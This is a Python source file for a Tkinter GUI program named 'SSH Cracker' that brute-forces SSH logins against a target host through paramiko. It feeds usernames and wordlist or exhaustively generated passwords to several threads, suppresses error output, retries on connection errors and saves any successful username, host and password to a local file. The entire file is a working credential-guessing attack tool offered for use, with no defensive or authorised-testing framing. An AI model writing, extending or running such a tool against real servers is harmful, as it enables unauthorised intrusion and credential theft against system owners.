import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import threading
import paramiko
import socket
import time
import itertools
import string
import queue
import os
import sys
import contextlib

q = queue.Queue()

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

def is_ssh_open(hostname, username, password, log_callback):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with suppress_stderr():
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        log_callback(f"[!] Host {hostname} unreachable.")
        return False
    except paramiko.AuthenticationException:
        log_callback(f"[-] Invalid {username}:{password}")
        return False
    except paramiko.SSHException as e:
        log_callback(f"[SSHException] {e}, retrying...")
        time.sleep(5)
        return is_ssh_open(hostname, username, password, log_callback)
    except Exception as e:
        log_callback(f"[Error] {e}")
        return False
    else:
        log_callback(f"[+] Success! {username}:{password}")
        with open("credentials.txt", "w") as f:
            f.write(f"{username}@{hostname}:{password}")
        return True

def load_lines(filepath):
    if filepath:
        with open(filepath, 'r') as f:
            return f.read().splitlines()
    return []

def generate_passwords(min_len, max_len, chars):
    for length in range(min_len, max_len + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def worker(host, log_callback):
    while not q.empty():
        username, password = q.get()
        if is_ssh_open(host, username, password, log_callback):
            q.queue.clear()
            break
        q.task_done()

class SSHCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SSH Cracker - Tkinter GUI")
        self.build_gui()

    def build_gui(self):
        pad = {'padx': 5, 'pady': 2}

        tk.Label(root, text="Host/IP:").grid(row=0, column=0, sticky="w", **pad)
        self.host_entry = tk.Entry(root, width=40)
        self.host_entry.grid(row=0, column=1, columnspan=2, **pad)

        tk.Label(root, text="Single Username:").grid(row=1, column=0, sticky="w", **pad)
        self.user_entry = tk.Entry(root)
        self.user_entry.grid(row=1, column=1, **pad)

        tk.Label(root, text="Username List File:").grid(row=2, column=0, sticky="w", **pad)
        self.user_file = tk.Entry(root)
        self.user_file.grid(row=2, column=1, **pad)
        tk.Button(root, text="Browse", command=self.browse_user_file).grid(row=2, column=2, **pad)

        tk.Label(root, text="Password List File:").grid(row=3, column=0, sticky="w", **pad)
        self.pass_file = tk.Entry(root)
        self.pass_file.grid(row=3, column=1, **pad)
        tk.Button(root, text="Browse", command=self.browse_pass_file).grid(row=3, column=2, **pad)

        self.generate_var = tk.IntVar()
        tk.Checkbutton(root, text="Generate Passwords", variable=self.generate_var).grid(row=4, column=0, sticky="w", **pad)

        tk.Label(root, text="Min Len:").grid(row=4, column=1, sticky="e", **pad)
        self.min_len = tk.Entry(root, width=5)
        self.min_len.insert(0, "1")
        self.min_len.grid(row=4, column=2, sticky="w", **pad)

        tk.Label(root, text="Max Len:").grid(row=5, column=1, sticky="e", **pad)
        self.max_len = tk.Entry(root, width=5)
        self.max_len.insert(0, "3")
        self.max_len.grid(row=5, column=2, sticky="w", **pad)

        tk.Label(root, text="Chars:").grid(row=6, column=0, sticky="w", **pad)
        self.chars = tk.Entry(root)
        self.chars.insert(0, string.ascii_lowercase + string.digits)
        self.chars.grid(row=6, column=1, columnspan=2, **pad)

        tk.Label(root, text="Threads:").grid(row=7, column=0, sticky="w", **pad)
        self.threads = tk.Entry(root, width=5)
        self.threads.insert(0, "4")
        self.threads.grid(row=7, column=1, sticky="w", **pad)

        tk.Button(root, text="Start Attack", command=self.start_attack).grid(row=8, column=0, columnspan=3, pady=10)

        self.log = scrolledtext.ScrolledText(root, width=60, height=15)
        self.log.grid(row=9, column=0, columnspan=3, **pad)

    def log_callback(self, message):
        self.log.insert(tk.END, message + '\n')
        self.log.see(tk.END)
        self.root.update()

    def browse_user_file(self):
        file = filedialog.askopenfilename()
        self.user_file.delete(0, tk.END)
        self.user_file.insert(0, file)

    def browse_pass_file(self):
        file = filedialog.askopenfilename()
        self.pass_file.delete(0, tk.END)
        self.pass_file.insert(0, file)

    def start_attack(self):
        host = self.host_entry.get().strip()
        if not host:
            messagebox.showerror("Error", "Please enter host")
            return

        users = []
        if self.user_file.get():
            users = load_lines(self.user_file.get())
        elif self.user_entry.get():
            users = [self.user_entry.get().strip()]
        else:
            messagebox.showerror("Error", "Please provide a username or user file.")
            return

        if self.generate_var.get():
            min_len = int(self.min_len.get())
            max_len = int(self.max_len.get())
            chars = self.chars.get()
            passwords = generate_passwords(min_len, max_len, chars)
        else:
            passwords = load_lines(self.pass_file.get())
            if not passwords:
                messagebox.showerror("Error", "Provide password file or enable generation.")
                return

        for user in users:
            for pwd in passwords:
                q.put((user, pwd))

        thread_count = int(self.threads.get())
        for _ in range(thread_count):
            t = threading.Thread(target=worker, args=(host, self.log_callback))
            t.daemon = True
            t.start()

        threading.Thread(target=lambda: q.join()).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = SSHCrackerGUI(root)
    root.mainloop()
